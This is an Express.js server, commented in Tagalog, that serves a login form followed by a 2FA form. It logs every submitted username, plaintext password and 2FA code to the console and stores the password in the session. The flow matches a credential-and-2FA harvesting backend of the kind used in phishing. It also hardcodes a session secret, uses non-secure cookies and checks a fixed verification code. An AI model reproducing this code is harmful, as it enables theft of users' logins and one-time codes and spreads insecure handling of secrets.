const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const Redis = require('ioredis');
const RedisStore = require('connect-redis')(session);

const app = express();
const PORT = process.env.PORT || 3000;

// Redis client connection
const redisClient = new Redis({
  host: 'localhost', // Palitan ito kung gumagamit ka ng Redis cloud service
  port: 6379, // Default Redis port
  password: '', // Kung may password sa Redis server mo
});

// Handle Redis connection
redisClient.on('connect', () => {
  console.log('Redis server connected!');
});

redisClient.on('error', (err) => {
  console.error('Redis connection error:', err);
});

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Session setup with Redis store
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: 'your-secret-key', // Palitan ito ng tunay na secret key
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false } // Gamitin ang secure: true kung HTTPS ang gamit mo
}));

// Route to serve the login form
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Route to handle login form submission
app.post('/submit', (req, res) => {
  const { username, password } = req.body;

  // Log the username and password
  console.log(`Username: ${username}`);
  console.log(`Password: ${password}`);

  // Save user info to session for later verification
  req.session.username = username;
  req.session.password = password;

  // Redirect to 2FA verification page
  res.redirect('/verify-2fa');
});

// Route to show the 2FA verification form
app.get('/verify-2fa', (req, res) => {
  if (!req.session.username) {
    return res.redirect('/');
  }

  res.send(`
    <form action="/verify-2fa" method="POST">
      <input type="number" name="authCode" placeholder="Enter 2FA Code" required>
      <button type="submit">Verify</button>
    </form>
  `);
});

// Route to handle 2FA verification
app.post('/verify-2fa', (req, res) => {
  const { authCode } = req.body;
  const { username, password } = req.session;

  // Log the username, password, and 2FA code
  console.log(`Username: ${username}`);
  console.log(`Password: ${password}`);
  console.log(`2FA Code: ${authCode}`);

  // Here you can simulate a 2FA check (you can replace this with real logic)
  if (authCode === '33444') {
    res.send('2FA Verified Successfully!');
  } else {
    res.send('Invalid 2FA Code.');
  }

  // Clear session after the verification
  req.session.destroy((err) => {
    if (err) {
      return console.log('Error destroying session:', err);
    }
    console.log('Session destroyed.');
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});
